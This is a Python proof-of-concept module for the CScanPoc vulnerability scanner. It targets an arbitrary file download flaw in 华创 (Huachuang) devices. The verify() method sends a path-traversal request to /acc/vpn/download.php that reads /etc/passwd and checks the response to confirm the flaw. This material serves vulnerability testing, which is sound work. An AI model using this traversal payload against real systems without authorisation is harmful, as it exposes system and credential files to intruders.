# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import urlparse

class Vuln(ABVuln):
    poc_id = '2d6ae245-ab81-4bb3-b52e-643ae40c6c3d'
    name = '华创设备 任意文件下载'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.FILE_DOWNLOAD  # 漏洞类型
    disclosure_date = 'Unkonwn'  # 漏洞公布时间
    desc = '''
        华创设备 /acc/vpn/download.php 任意文件下载。
    '''  # 漏洞描述
    ref = 'Unkonwn'  # 漏洞来源
    cnvd_id = 'Unkonwn'  # cnvd漏洞编号
    cve_id = 'Unkonwn'  # cve编号
    product = '华创'  # 漏洞应用名称
    product_version = '华创'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = '2d1bc8bd-0e38-4548-8fcc-bfd5a93da85d'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-22'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            hh = hackhttp.hackhttp()
            payload = self.target + '/acc/vpn/download.php?f=../../../../../../etc/passwd'
            code, head, res, err, _ = hh.http(payload)

            if code == 200 and 'root:x:0:0:' in res:
                #security_hole('arbitrarily file download: ' + payload)
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()

if __name__ == '__main__':
    Poc().run()
